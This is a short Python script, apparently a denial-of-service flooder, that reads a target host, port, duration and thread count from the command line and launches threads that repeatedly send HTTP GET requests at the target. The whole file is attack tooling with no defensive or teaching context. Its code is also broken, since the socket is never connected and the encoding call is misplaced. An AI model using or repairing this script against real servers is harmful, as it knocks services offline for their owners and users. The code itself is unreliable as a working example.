import os, socket, sys, threading, time, random

host = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4])
waktu_skrg = int(time.time()) + int(times)

def send_attack():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while int(time.time()) < waktu_skrg:
		s.send("GET / HTTP/1.1").encode()

for _ in range(threads):
	threading.Thread(target = send_attack).start()